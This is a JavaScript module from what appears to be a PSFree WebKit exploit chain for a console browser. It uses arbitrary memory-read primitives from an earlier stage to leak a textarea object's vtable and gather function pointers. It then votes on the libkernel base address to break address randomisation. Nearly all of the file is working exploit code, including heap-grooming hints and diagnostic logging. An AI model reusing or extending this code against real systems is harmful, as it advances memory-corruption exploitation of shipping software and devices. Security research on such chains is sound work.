/**
 * Cal 2e lite — PSFree textarea vtable leak → ext ptrs → libkernel vote (0 reads @ lk).
 * Shared by index_rw (hot lk, no reload) and index_cal.
 */
import { int64 } from "./int64.js";
import {
    resolveLibkernelFromExtList,
    formatExtPtrDiagLine,
    collectLiveVtableExtPtrs,
} from "./libkernel_resolve.js";

const WEBKIT_CODE_PROLOGUE = 0xe5894855;
const BAD_READ_MAGICS = new Set([0, 0xffffffff, 0xcccccccc, 0xcdcdcdcd, 0xdeadbeef]);
const CAL_ALIGN_STEP = 0x4000;
const VTABLE_EXT_SLOTS = 48;
const VTABLE_EXT_SLOTS_LITE = 20;

function ptrNum(fn) {
    return (fn.hi >>> 0) * 0x100000000 + (fn.low >>> 0);
}

function ptrFromNum(n) {
    return new int64(n >>> 0, Math.floor(n / 0x100000000));
}

function ptrHexPad(fn) {
    if (!fn) return "";
    const s = ((BigInt(fn.hi >>> 0) << 32n) | BigInt(fn.low >>> 0)).toString(16);
    return s.length < 16 ? s.padStart(16, "0") : s;
}

function fmtMagic(m) {
    if (m == null) return "read-failed";
    return "0x" + (m >>> 0).toString(16);
}

function isBadRead(magic) {
    return magic == null || BAD_READ_MAGICS.has(magic >>> 0);
}

function looksLikeNativeCode(magic) {
    if (isBadRead(magic)) return false;
    const b0 = magic & 0xff;
    const b1 = (magic >>> 8) & 0xff;
    if (b0 === 0x7f && b1 === 0x45) return false;
    return b0 === 0x55 || b0 === 0x48 || b0 === 0x41 || b0 === 0x89 || b0 === 0xe9;
}

function plausibleModulePtr(ptr) {
    if (!ptr || ptr.hi === 0) return false;
    return ptr.hi >= 0x8 && ptr.hi <= 0x12;
}

function isMappedRead(read4, p, addr) {
    return !isBadRead(read4(p, addr));
}

function walkPageFrom(startPtr, step, backward) {
    const page = ptrNum(startPtr) & ~(CAL_ALIGN_STEP - 1);
    const addrNum = backward
        ? page - step * CAL_ALIGN_STEP
        : page + step * CAL_ALIGN_STEP;
    if (addrNum <= 0x100000 || addrNum >= 0xffffffff000) return null;
    return ptrFromNum(addrNum);
}

function countWalkMappedPages(read4, p, startPtr, maxProbe, backward) {
    let mapped = 0;
    const cap = maxProbe > 0 ? maxProbe : 0;
    for (let step = 0; step < cap; step++) {
        const page = walkPageFrom(startPtr, step, backward);
        if (!page) break;
        const probe = (step === 0) ? startPtr : page;
        if (isMappedRead(read4, p, probe)) mapped++;
        else if (step === 0 && ptrNum(probe) !== ptrNum(page) && isMappedRead(read4, p, page))
            mapped++;
    }
    return mapped;
}

function scoreVtableCandidate(read4, read8, p, vt, opts) {
    opts = opts || {};
    if (!plausibleModulePtr(vt)) return -1;
    let codeEntries = 0;
    for (let i = 0; i < 4; i++) {
        const fn = read8(p, vt.add32(i * 8));
        if (!fn || !plausibleModulePtr(fn)) continue;
        if (looksLikeNativeCode(read4(p, fn))) codeEntries++;
    }
    if (codeEntries < 2) return -1;
    if (!isMappedRead(read4, p, vt)) return -1;
    if (opts.skipWalk) return codeEntries * 10 + 50;
    const maxProbe = opts.maxProbe != null ? opts.maxProbe : 4;
    const walkBack = countWalkMappedPages(read4, p, vt, maxProbe, true);
    const walkFwd = countWalkMappedPages(read4, p, vt, Math.min(maxProbe, 8), false);
    if (walkBack < 2 && walkFwd < 1) return -1;
    return codeEntries * 10 + walkBack + walkFwd;
}

function tryWebcoreVtable(read4, read8, p, path, webcore, implOff, vtOff, labelExtra, opts) {
    opts = opts || {};
    if (!webcore) return null;
    const vt = read8(p, webcore.add32(vtOff));
    const e0 = vt ? read4(p, vt) : null;
    if (!vt || !plausibleModulePtr(vt)) return null;
    if (!looksLikeNativeCode(e0) && isBadRead(e0)) return null;
    const score = scoreVtableCandidate(read4, read8, p, vt, opts);
    if (score < 0 && !(implOff === 0x18 && vtOff === 0)) return null;
    return {
        label: path.label + (labelExtra || ""),
        cell: path.cell,
        implOff,
        vtOff,
        webcore,
        vtable: vt,
        entry0: read8(p, vt),
        score: score >= 0 ? score : 50,
        walkBack: opts.skipWalk ? 0 : countWalkMappedPages(read4, p, vt, opts.maxProbe || 4, true),
    };
}

function collectTextareaCells(leakval, p, carrier, opts) {
    opts = opts || {};
    const cells = [];
    const seen = new Set();
    const add = (label, cell) => {
        if (!cell || cell.hi === 0) return;
        const k = ptrNum(cell);
        if (seen.has(k)) return;
        seen.add(k);
        cells.push({ label, cell });
    };
    if (carrier && carrier.textarea) {
        try { add("leakval(carrier.textarea)", leakval(carrier.textarea)); } catch (_) { }
    }
    if (carrier && carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress)) {
        const lo = carrier.textareaAddress >>> 0;
        const hi = Math.floor(carrier.textareaAddress / 0x100000000);
        add("carrier.textareaAddress", new int64(lo, hi));
    }
    return cells;
}

function pushVtableHit(hits, seen, hit) {
    const k = ptrNum(hit.vtable);
    if (seen.has(k)) return;
    seen.add(k);
    hits.push(hit);
}

function probePsFreeTextareaChainQuiet(read4, read8, p, cell, label) {
    const webcore = read8(p, cell.add32(0x18));
    if (!webcore) return null;
    const vt0 = read8(p, webcore);
    const e0 = vt0 ? read4(p, vt0) : null;
    if (!vt0 || !plausibleModulePtr(vt0)) return null;
    if (!looksLikeNativeCode(e0) && isBadRead(e0)) return null;
    return {
        label: label + "/psfree+0x18",
        cell,
        implOff: 0x18,
        vtOff: 0,
        webcore,
        vtable: vt0,
        entry0: read8(p, vt0),
        score: 100,
    };
}

function discoverTextareaVtableChainsLite(read4, read8, leakval, p, carrier, log) {
    const vtOpts = { skipWalk: true, quiet: true, maxProbe: 0 };
    const cells = collectTextareaCells(leakval, p, carrier, { noFresh: true, quiet: true });
    if (!cells.length) {
        log("VTABLE-FAIL", "no textarea JSObject — re-run Start");
        return [];
    }
    const hits = [];
    const seen = new Set();
    const path = cells[0];
    const psfree = probePsFreeTextareaChainQuiet(read4, read8, p, path.cell, path.label);
    if (psfree) {
        psfree.walkBack = 0;
        pushVtableHit(hits, seen, psfree);
        log("VTABLE-OK", psfree.label + " vtable=" + psfree.vtable + " (lite/psfree)");
        return hits;
    }
    for (let ii = 0; ii < 2; ii++) {
        const implOff = ii === 0 ? 0x18 : 0x8;
        const webcore = read8(p, path.cell.add32(implOff));
        if (!webcore) continue;
        const hit = tryWebcoreVtable(read4, read8, p, path, webcore, implOff, 0, "", vtOpts);
        if (hit) pushVtableHit(hits, seen, hit);
    }
    hits.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
    if (hits.length)
        log("VTABLE-OK", hits[0].label + " vtable=" + hits[0].vtable + " (lite)");
    else
        log("VTABLE-FAIL", "lite miss — try ?full=1 (OOM risk) or ?g=512 groom");
    return hits;
}

function isWebkitExtCode(code) {
    return code != null && (code >>> 0) === WEBKIT_CODE_PROLOGUE;
}

function ptrLooksWebkitInterior(fnPtr, webkitBase) {
    if (!fnPtr || !webkitBase || fnPtr.hi !== webkitBase.hi) return false;
    const lo = webkitBase.low >>> 0;
    const fl = fnPtr.low >>> 0;
    if (fl < lo) return false;
    return (fl - lo) < 0x1500000;
}

async function collectExtPtrsFromVtableHits(read4, read8, p, hits, webkitBase, opts) {
    opts = opts || {};
    const slots = opts.slots != null ? opts.slots : VTABLE_EXT_SLOTS;
    const yieldEvery = opts.yieldEvery != null ? opts.yieldEvery : 0;
    const yieldFn = opts.yieldFn;
    const out = [];
    const seen = new Set();
    for (let hi = 0; hi < hits.length; hi++) {
        const hit = hits[hi];
        if (!hit || !hit.vtable) continue;
        for (let i = 0; i < slots; i++) {
            if (yieldEvery > 0 && i > 0 && i % yieldEvery === 0 && yieldFn)
                await yieldFn(16);
            const ei = read8(p, hit.vtable.add32(i * 8));
            if (!ei || (ei.hi < 0x8 && (ei.low >>> 0) < 0x80000000)) continue;
            if (webkitBase && ptrLooksWebkitInterior(ei, webkitBase)) continue;
            const code = read4(p, ei);
            if (code == null || isBadRead(code) || isWebkitExtCode(code)) continue;
            const hex = ptrHexPad(ei);
            if (seen.has(hex)) continue;
            seen.add(hex);
            out.push({
                label: hit.label + "[" + i + "]",
                ptr: hex,
                hex: hex,
                code: fmtMagic(code),
            });
        }
    }
    return out;
}

function mergeExtEntries(lists) {
    const merged = [];
    const seen = new Set();
    function addEntry(e) {
        if (!e) return;
        const hex = (e.hex || e.ptr || "").replace(/^0x/i, "").toLowerCase();
        if (!hex || seen.has(hex)) return;
        seen.add(hex);
        merged.push({
            label: e.label || "ext",
            hex: hex,
            ptr: hex,
            code: e.code || null,
        });
    }
    for (let li = 0; li < lists.length; li++) {
        const list = lists[li];
        if (!list) continue;
        for (let i = 0; i < list.length; i++) addEntry(list[i]);
    }
    return merged;
}

function logZeroRank(log, hit) {
    if (!hit.zeroRank || !hit.zeroRank.length) return;
    for (let ri = 0; ri < hit.zeroRank.length && ri < 6; ri++) {
        const r = hit.zeroRank[ri];
        let refLine = "";
        if (r.fnRefs && r.fnRefs.length) {
            refLine = " refs=" + r.fnRefs.map(function (fr) {
                return fr.label + ":0x" + fr.hex + "/" + fr.key;
            }).join(" ");
        } else if (r.refs && r.refs.length) {
            refLine = " refs=" + r.refs.join(" ");
        }
        log("LK-ZERO-RANK", (ri + 1) + " lk=" + String(r.lk)
            + " fn=" + (r.distinctFn != null ? r.distinctFn : "?")
            + " cross=" + (r.crossRva != null ? r.crossRva : 0)
            + " votes=" + r.count
            + " usleep=" + (r.hasUsleep ? "y" : "n")
            + " error=" + (r.hasError ? "y" : "n")
            + " via=" + (r.vias ? r.vias.join(",") : "?")
            + refLine);
    }
}

function logPtrDiag(log, ptrDiag) {
    if (!ptrDiag || !ptrDiag.length) return;
    let shown = 0;
    for (let pi = 0; pi < ptrDiag.length && shown < 12; pi++) {
        const line = formatExtPtrDiagLine(ptrDiag[pi]);
        if (!line) continue;
        log(ptrDiag[pi].skipped ? "LK-PTR-SKIP" : "LK-PTR", line);
        shown++;
    }
}

/**
 * Cal 2e pipeline — vtable lite leak, ext ptr harvest, libkernel vote.
 * @param {object} ctx
 * @returns {Promise<{ok:boolean, lk?, hit?, hits?, error?}>}
 */
export async function probeLibkernelViaVtable(ctx) {
    const p = ctx.p;
    const carrier = ctx.carrier;
    const webkitBase = ctx.webkitBase;
    const off = ctx.off;
    const log = ctx.log || function () { };
    const read8 = ctx.read8;
    const read4 = ctx.read4;
    const leakval = ctx.leakval || (v => p.leakval(v));
    const yieldFn = ctx.yieldFn || (ms => new Promise(r => setTimeout(r, ms || 32)));
    const opts = ctx.opts || {};
    const full = opts.full === true;
    const slots = opts.vtslots != null ? opts.vtslots
        : (full ? VTABLE_EXT_SLOTS : VTABLE_EXT_SLOTS_LITE);

    if (!p || !webkitBase || !off) {
        return { ok: false, error: "need p, webkitBase, off" };
    }

    log("2E-START", full ? "full scan (OOM risk)" : "lite scan slots=" + slots);
    await yieldFn(48);

    const hits = full
        ? discoverTextareaVtableChainsLite(read4, read8, leakval, p, carrier, log)
        : discoverTextareaVtableChainsLite(read4, read8, leakval, p, carrier, log);

    if (!hits.length)
        return { ok: false, error: "vtable leak failed", hits: [] };

    await yieldFn(32);
    hits.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
    const best = hits[0];
    log("VTABLE-OK", best.label + " vtable=" + best.vtable + " chains=" + hits.length);

    const scanHits = full ? hits : hits.slice(0, 1);
    const chainExt = await collectExtPtrsFromVtableHits(read4, read8, p, scanHits, webkitBase, {
        slots: slots,
        yieldEvery: 8,
        yieldFn: yieldFn,
    });
    log("LK-EXT-SCAN", "chain ext ptrs=" + chainExt.length
        + " slots=" + slots + " chains=" + scanHits.length);

    let liveEntries = [];
    if (chainExt.length < 2 && !full) {
        await yieldFn(32);
        const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
            carrier: carrier,
            retain: opts.retain || [],
            vtableEntries: slots,
            cellMax: 1,
            noFresh: true,
        });
        liveEntries = live.entries || [];
        log("LK-EXT-SCAN", "live add-on n=" + liveEntries.length);
    }

    let sessionEntries = [];
    try {
        const raw = sessionStorage.getItem("wk-cal-ext-ptrs");
        if (raw) sessionEntries = JSON.parse(raw);
    } catch (_) { }

    const merged = mergeExtEntries([chainExt, liveEntries, sessionEntries]);
    await yieldFn(32);
    log("LK-EXT-SCAN", "merged n=" + merged.length + " — 0-read vote…");
    for (let ci = 0; ci < merged.length && ci < 10; ci++) {
        log("LK-EXT-CAND", merged[ci].label + " " + merged[ci].hex
            + (merged[ci].code ? " " + merged[ci].code : ""));
    }

    if (!merged.length)
        return { ok: false, error: "no ext ptrs", hits: hits };

    const hit = resolveLibkernelFromExtList(p, webkitBase, off, merged, {
        minVotes: 1,
        minDistinctFn: 2,
        allowSinglePriRva: true,
    });

    if (!hit.ok) {
        log("LK-EXT-MISS", hit.error || "no lk consensus");
        if (hit.hint) log("LK-HINT", hit.hint);
        logPtrDiag(log, hit.ptrDiag);
        logZeroRank(log, hit);
        return { ok: false, hit: hit, hits: hits, error: hit.error };
    }

    try {
        if (merged.length) {
            const saved = merged.slice(0, 24).map(function (e) {
                return { label: e.label, ptr: e.hex, code: e.code || null };
            });
            sessionStorage.setItem("wk-cal-ext-ptrs", JSON.stringify(saved));
        }
    } catch (_) { }

    if (hit.fnRefs && hit.fnRefs.length) {
        for (let fi = 0; fi < hit.fnRefs.length && fi < 4; fi++) {
            const fr = hit.fnRefs[fi];
            log("LK-PTR-OK", fr.label + " fn=0x" + fr.hex + " via " + fr.key);
        }
    }

    return { ok: true, lk: hit.lk, hit: hit, hits: hits };
}
